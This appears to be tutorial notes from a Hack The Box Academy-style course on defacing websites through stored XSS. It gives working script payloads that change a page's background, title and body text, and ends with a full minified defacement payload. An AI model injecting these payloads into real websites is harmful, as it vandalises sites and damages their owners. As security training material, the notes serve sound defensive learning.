# Defacing

## Overview

Website defacing through XSS (particularly stored XSS) is a common attack method where attackers alter a website's appearance to claim a successful breach. This can have significant media impact and affect company valuations, especially for banks and tech firms.

## Defacement Elements

Four main HTML elements are used to change a web page's appearance:

| Element | Property |
|---------|----------|
| Background Color | `document.body.style.background` |
| Background Image | `document.body.background` |
| Page Title | `document.title` |
| Page Text | `document.getElementById().innerHTML` |

## Changing Background Color

**Payload:**
```javascript
<script>document.body.style.background = "#141d2b"</script>
```

**Alternative with image:**
```javascript
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

## Changing Page Title

```javascript
<script>document.title = 'HackTheBox Academy'</script>
```

## Changing Page Text

### Using vanilla JavaScript:
```javascript
document.getElementById("todo").innerHTML = "New Text"
document.getElementsByTagName('body')[0].innerHTML = "New Text"
```

### Using jQuery:
```javascript
$("#todo").html('New Text');
```

## Complete Defacement Example

**HTML template:**
```html
<center>
    <h1 style="color: white">Cyber Security Training</h1>
    <p style="color: white">by 
        <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy">
    </p>
</center>
```

**Complete XSS payload (minified):**
```javascript
<script>document.body.style.background = "#141d2b"; document.title = 'HackTheBox Academy'; document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"></p></center>'</script>
```

> **Tip:** Test HTML locally before deployment to ensure proper rendering.

## How It Works

The injected JavaScript executes at the end of the page source code, modifying the DOM and changing the visible appearance while preserving the original HTML underneath.
